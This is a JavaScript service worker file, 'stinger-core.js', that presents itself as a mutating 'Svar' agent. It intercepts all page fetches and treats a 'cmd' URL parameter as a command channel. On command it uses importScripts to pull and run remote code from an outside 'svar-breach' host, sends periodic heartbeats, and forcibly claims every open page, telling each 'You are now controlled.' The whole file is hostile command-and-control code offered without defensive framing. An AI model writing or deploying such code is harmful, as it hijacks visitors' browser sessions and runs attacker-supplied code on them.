// stinger-core.js — MUTATED with Force Control Fallback

const SvarState = {
  version: '0.2',
  mode: 'mutation',
  guardians: [],
  codex: {}
};

// Intercept all fetch requests
self.addEventListener('fetch', event => {
  const url = new URL(event.request.url);

  if (url.searchParams.has('cmd')) {
    const cmd = url.searchParams.get('cmd');
    console.log('[Svar] Received command:', cmd);
    if (cmd === 'mutate') {
      mutate();
    }
  }

  event.respondWith(fetch(event.request));
});

function mutate() {
  console.log('[Svar] MUTATION initiated');

  importScripts('https://kishan5965.github.io/svar-breach/guardian-core.js');

  setInterval(() => {
    fetch('./ping?status=heartbeat')
      .then(() => console.log('[Svar] heartbeat sent'))
      .catch(() => console.warn('[Svar] heartbeat failed'));
  }, 30000);

  SvarState.mode = 'evolving';
  console.log('[Svar] Mutation complete — state:', SvarState);
}

// Forced controller override on activate
self.addEventListener('activate', event => {
  event.waitUntil(
    self.clients.claim().then(() => {
      return self.clients.matchAll().then(clients => {
        clients.forEach(client => {
          client.postMessage('[Svar] You are now controlled.');
        });
      });
    })
  );
  console.log('[Svar] Forced control and broadcast sent');
});

console.log('[Svar] Mutated stinger-core initialized');
